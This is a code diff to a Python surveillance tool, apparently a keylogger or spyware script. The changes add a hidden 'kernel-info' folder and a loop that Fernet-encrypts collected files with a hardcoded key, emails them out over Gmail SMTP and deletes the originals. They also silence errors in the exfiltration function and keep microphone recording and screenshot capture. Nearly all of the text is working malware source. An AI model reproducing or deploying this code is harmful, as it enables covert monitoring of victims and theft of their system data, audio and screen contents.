@@ -11,17 +11,29 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 import socket,platform,time,os,smtplib,getpass
 import sounddevice as sd
+import getpass
 
+#path setup and file hiding
+username = getpass.getuser()
+filepath = "/home/" + username+ "/bin/kernel-info"
+try:
+    os.mkdir(filepath)
+except:
+    pass
+
+#other var setup
 logpath = "/report.txt"
 syspath = "/info.txt"
+encryptedlog = "/ereport.txt"
+encryptedsys = "/einfo.txt"
 audiopath = "/audio"
 imagepath = "/img"
-filepath = (r"/home/gustavo/documents/python")
 email_address = "<insert_email>"
 email_password = "<insert_password>"
 microphoneTime = 5
 periodOfAction = 2
 
+#globals
 global screenshot, audio
 screenshot = 0 
 audio = 0
@@ -71,29 +83,32 @@ while timerIterations < periodOfAction:
         if currentTime > stoppingTime:
             return False
 
-    #smtp loggin is dead
+    #smtp google login is dead
     def send_email(filename, attachment, towho):
-        #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
-        incoming = email_address
-        msg = MIMEMultipart()
-        msg['From'] = incoming
-        msg['To'] = towho   
-        msg['Subject'] = "sys_report.v1"
-        body = "Body_of_the_mail"
-        msg.attach(MIMEText(body,'plain'))
-        filename = filename
-        attachment = open(attachment, 'rb')
-        p = MIMEBase('application', 'octet-stream')
-        p.set_payload((attachment).read())
-        encoders.encode_base64(p)
-        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-        msg.attach(p)
-        s = smtplib.SMTP('smtp.gmail.com', 587)
-        s.starttls()
-        s.login(email_address, email_password)
-        text = msg.as_string()
-        s.sendmail(email_address, towho, text)
-        s.quit()
+        try:
+            #currently using same email to send and to receive, ideal would be to have two separate so the 'user' cant have access to account and infoo
+            incoming = email_address
+            msg = MIMEMultipart()
+            msg['From'] = incoming
+            msg['To'] = towho   
+            msg['Subject'] = "sys_report.v1"
+            body = "Body_of_the_mail"
+            msg.attach(MIMEText(body,'plain'))
+            filename = filename
+            attachment = open(attachment, 'rb')
+            p = MIMEBase('application', 'octet-stream')
+            p.set_payload((attachment).read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+            msg.attach(p)
+            s = smtplib.SMTP('smtp.gmail.com', 587)
+            s.starttls()
+            s.login(email_address, email_password)
+            text = msg.as_string()
+            s.sendmail(email_address, towho, text)
+            s.quit()
+        except:
+            pass
 
     #gets os info
     def comp_info():
@@ -115,6 +130,7 @@ while timerIterations < periodOfAction:
 
     comp_info()
 
+    #capture's microphone audio
     def get_audio(audio):
         freq = 44100
         time = microphoneTime
@@ -129,6 +145,7 @@ while timerIterations < periodOfAction:
 
     audio = get_audio(audio)
 
+    #takes screenshot
     def get_screen(screenshot):
         screenshotstr = str(screenshot)
         try:
@@ -151,3 +168,25 @@ while timerIterations < periodOfAction:
         timerIterations += 1
         currentTime = time.time()
         stoppingTime = time.time() + timeIteration
+
+j = 0
+toEncrypt = [filepath + logpath, filepath + syspath]
+encrypted = [filepath + encryptedlog, filepath + encryptedsys]
+
+#file encryption loop
+for file in toEncrypt:
+    with open(toEncrypt[j], 'rb') as f:
+        data = f.read()
+        
+    encryptedData = Fernet("xheNiDEWth3vz8raCmrVjkbab1fBvFArMZHIPNuWkQs=").encrypt(data)
+
+    with open(encrypted[j], "wb") as g:
+        g.write(encryptedData)
+
+    send_email("logreport", toEncrypt[j], email_address)
+    
+    #deletes the original file(non encrypted) 
+    os.remove(toEncrypt[j])
+    j += 1
+
+time.sleep(100)
